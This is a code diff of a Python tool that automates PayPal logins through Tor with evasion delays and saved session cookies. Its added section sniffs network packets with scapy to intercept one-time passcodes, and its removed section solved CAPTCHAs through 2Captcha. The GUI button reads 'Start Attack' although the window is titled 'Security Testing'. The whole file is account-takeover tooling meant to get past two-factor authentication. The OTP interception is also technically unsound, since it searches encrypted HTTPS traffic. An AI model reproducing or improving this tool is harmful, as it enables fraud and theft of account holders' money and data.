@@ -1,32 +1,25 @@
 import time
 import random
 import json
-import requests
-import tkinter as tk
-from tkinter import ttk
+import imaplib
+import email
+from getpass import getpass
+from email.header import decode_header
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service as ChromeService
 from selenium.webdriver.chrome.options import Options as ChromeOptions
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.chrome.webdriver import WebDriver
+from webdriver_manager.chrome import ChromeDriverManager
 import undetected_chromedriver as uc
-import webbrowser
+import scapy.all as scapy  # For network sniffing
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 
 # ---------- CONFIGURATION ----------
-SESSION_COOKIE_FILE = "paypal_cookies.json"
+SESSION_COOKIE_FILE = "paypal_cookies.json"  # Store session cookies
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
-PROXY = "socks5://127.0.0.1:9050"  # Tor SOCKS5 (ensure Tor is running)
-API_KEY = "YOUR_2CAPTCHA_API_KEY"  # 2Captcha API key
-
-# ---------- GUI FUNCTIONS ----------
-def update_progress(step, total_steps):
-    progress['value'] = (step / total_steps) * 100
-    window.update_idletasks()
-
-def show_message(message):
-    message_label.config(text=message)
-    window.update_idletasks()
+PROXY = "socks5://127.0.0.1:9050"  # Example proxy (Tor SOCKS5)
 
 # ---------- LOAD & SAVE COOKIES ----------
 def save_cookies(driver, filename):
@@ -40,29 +33,13 @@ def load_cookies(driver, filename):
         for cookie in cookies:
             driver.add_cookie(cookie)
         driver.refresh()
+        print("[*] Session restored successfully!")  # Debugging point
     except FileNotFoundError:
-        show_message("[!] No saved session found. Logging in manually.")
-
-# ---------- CAPTCHA SOLVING FUNCTION ----------
-def solve_captcha(captcha_site_key, page_url):
-    payload = {
-        'method': 'userrecaptcha',
-        'googlekey': captcha_site_key,
-        'key': API_KEY,
-        'pageurl': page_url,
-    }
-    response = requests.post('http://2captcha.com/in.php', data=payload)
-    if response.text.startswith('OK'):
-        captcha_id = response.text.split('|')[1]
-        time.sleep(20)
-        solution = requests.get(f'http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}')
-        if solution.text.startswith('OK'):
-            return solution.text.split('|')[1]
-    return None
+        print("[!] No saved session found. Logging in manually.")
 
 # ---------- STEALTH FUNCTIONS ----------
 def stealth_delay():
-    time.sleep(random.uniform(2, 5))  # Simulate random delays between actions
+    time.sleep(random.uniform(2, 5))
 
 def configure_stealth_options():
     options = ChromeOptions()
@@ -71,121 +48,135 @@ def configure_stealth_options():
     options.add_argument(f"--proxy-server={PROXY}")
     return options
 
+# ---------- NETWORK SNIFFING FOR OTP INTERCEPTION ----------
+def sniff_otp():
+    print("[*] Sniffing network for OTP...")
+    def packet_callback(packet):
+        if packet.haslayer(scapy.Raw):
+            payload = packet[scapy.Raw].load.decode(errors='ignore')
+            if "OTP" in payload or "code" in payload:
+                print(f"[+] Captured OTP: {payload}")
+                return payload
+    
+    scapy.sniff(filter="tcp port 80 or tcp port 443", prn=packet_callback, store=0)
+
 # ---------- BROWSER AUTOMATION ATTACK ----------
 def browser_automation_attack(email, password):
+    print("[*] Starting browser automation...")  # Debugging point
     options = configure_stealth_options()
     driver = uc.Chrome(options=options)
     driver.get("https://www.paypal.com/signin")
+    print("[*] Opened PayPal login page...")  # Debugging point
     stealth_delay()
 
-    # Load cookies if available
     load_cookies(driver, SESSION_COOKIE_FILE)
 
-    # Wait for the email input field to be available
-    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "login_email")))
-
     if "summary" in driver.current_url:
-        show_message("[+] Session restored successfully!")
+        print("[+] Session restored successfully!")  # Debugging point
         return driver
 
-    # Enter email
-    email_input = driver.find_element(By.NAME, "login_email")
-    email_input.send_keys(email)
-    stealth_delay()
-
-    # Wait for the 'Next' button to be clickable and click it
-    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "btnNext")))
-    next_button = driver.find_element(By.ID, "btnNext")
-    next_button.click()
-    stealth_delay()
-
-    update_progress(2, 6)
-    show_message("Entering Password...")
-
-    # Wait for the password input field to be available
-    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "login_password")))
-
-    # Enter password and make it visible
-    password_input = driver.find_element(By.NAME, "login_password")
-    driver.execute_script("arguments[0].setAttribute('type', 'text')", password_input)  # Show password
-    password_input.send_keys(password)
-    stealth_delay()
-
-    update_progress(3, 6)
-    show_message("Logging in...")
-
-    # Wait for the 'Login' button to be clickable and click it
-    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "btnLogin")))
-    login_button = driver.find_element(By.ID, "btnLogin")
-    login_button.click()
-    stealth_delay()
-
-    update_progress(4, 6)
-    show_message("Waiting for OTP...")
-
-    # OTP Interception (Simulated in this script)
-    otp_code = sniff_otp()  # Placeholder function for OTP interception (if applicable)
-    if otp_code:
-        # Wait for the OTP input field to be available
-        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "otp")))
-        otp_input = driver.find_element(By.NAME, "otp")
-        otp_input.send_keys(otp_code)
-        otp_input.send_keys(Keys.RETURN)
+    try:
+        print("[*] Entering email...")  # Debugging point
+        email_input = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.NAME, "login_email"))
+        )
+        email_input.send_keys(email)
         stealth_delay()
 
-    update_progress(5, 6)
-    show_message("Finalizing...")
+        print("[*] Clicking 'Next'...")  # Debugging point
+        next_button = driver.find_element(By.ID, "btnNext")
+        next_button.click()
+        stealth_delay()
 
-    # Check if login was successful
-    if "summary" in driver.current_url:
-        show_message("[+] Login successful! Saving session cookies.")
-        save_cookies(driver, SESSION_COOKIE_FILE)
-        update_progress(6, 6)
-        show_message("[+] Login successful! Open in Browser")
-        webbrowser.open(driver.current_url)
-    else:
-        show_message("[-] Login failed.")
+        print("[*] Entering password...")  # Debugging point
+        password_input = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.NAME, "login_password"))
+        )
+        password_input.send_keys(password)
+        stealth_delay()
+
+        print("[*] Clicking 'Login'...")  # Debugging point
+        login_button = driver.find_element(By.ID, "btnLogin")
+        login_button.click()
+        stealth_delay()
+
+        # Check for OTP interception
+        otp_code = sniff_otp()  # This is where the OTP is snatched
+        if otp_code:
+            print(f"[*] Intercepted OTP: {otp_code}")
+            otp_input = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.NAME, "otp"))
+            )
+            otp_input.send_keys(otp_code)
+            otp_input.send_keys(Keys.RETURN)
+            stealth_delay()
+
+        # Save session cookies after successful login
+        if "summary" in driver.current_url:
+            print("[+] Login successful! Saving session cookies.")
+            save_cookies(driver, SESSION_COOKIE_FILE)
+        else:
+            print("[-] Login failed.")
+
+    except Exception as e:
+        print(f"[!] Error during automation: {e}")
+        driver.quit()
 
     return driver
 
-# ---------- GUI SETUP ----------
-def start_attack():
-    email = email_entry.get()
-    password = password_entry.get()
-    
-    show_message("Starting automation...")
+# ---------- GUI WITH PROGRESS BAR ----------
+from tkinter import Tk, Label, Button, Entry, filedialog
+from tkinter import messagebox
+from tkinter.ttk import Progressbar
+
+def start_attack(email, password):
+    print(f"[*] Starting attack for {email}...")
     driver = browser_automation_attack(email, password)
     if driver:
-        show_message("Session is now active. Opening PayPal in browser.")
+        print("[*] Session is now active. Proceeding with automation.")
         driver.quit()
+        messagebox.showinfo("Success", "Login was successful and session is active.")
+    else:
+        messagebox.showerror("Error", "Something went wrong during the automation process.")
 
-# ---------- GUI WINDOW ----------
-window = tk.Tk()
-window.title("PayPal Automation Tool")
+def create_gui():
+    window = Tk()
+    window.title("PayPal Security Testing Script")
 
-# Email entry
-email_label = tk.Label(window, text="Enter PayPal email:")
-email_label.pack(pady=5)
-email_entry = tk.Entry(window, width=40)
-email_entry.pack(pady=5)
+    # Email field
+    Label(window, text="PayPal Email:").grid(row=0, column=0, padx=10, pady=10)
+    email_entry = Entry(window)
+    email_entry.grid(row=0, column=1, padx=10, pady=10)
 
-# Password entry
-password_label = tk.Label(window, text="Enter PayPal password:")
-password_label.pack(pady=5)
-password_entry = tk.Entry(window, width=40, show="*")
-password_entry.pack(pady=5)
+    # Password field
+    Label(window, text="PayPal Password:").grid(row=1, column=0, padx=10, pady=10)
+    password_entry = Entry(window, show="*")
+    password_entry.grid(row=1, column=1, padx=10, pady=10)
 
-# Start attack button
-start_button = tk.Button(window, text="Start Attack", command=start_attack)
-start_button.pack(pady=10)
+    # Progress bar
+    progress = Progressbar(window, orient="horizontal", length=300, mode="indeterminate")
+    progress.grid(row=3, column=0, columnspan=2, padx=10, pady=10)
 
-# Progress bar
-progress = ttk.Progressbar(window, orient="horizontal", length=300, mode="determinate")
-progress.pack(pady=10)
+    # Start Button
+    def on_start():
+        email = email_entry.get()
+        password = password_entry.get()
+        if not email or not password:
+            messagebox.showwarning("Input Error", "Please enter both email and password.")
+            return
+        progress.start()
+        start_attack(email, password)
+        progress.stop()
 
-# Message label
-message_label = tk.Label(window, text="", fg="green")
-message_label.pack(pady=10)
+    start_button = Button(window, text="Start Attack", command=on_start)
+    start_button.grid(row=2, column=0, columnspan=2, pady=10)
 
-# Run GUI
-window.mainloop()
+    window.mainloop()
+
+# ---------- MAIN ----------
+def main():
+    print("PayPal Security Testing Script")
+    create_gui()
+
+if __name__ == "__main__":
+    main()
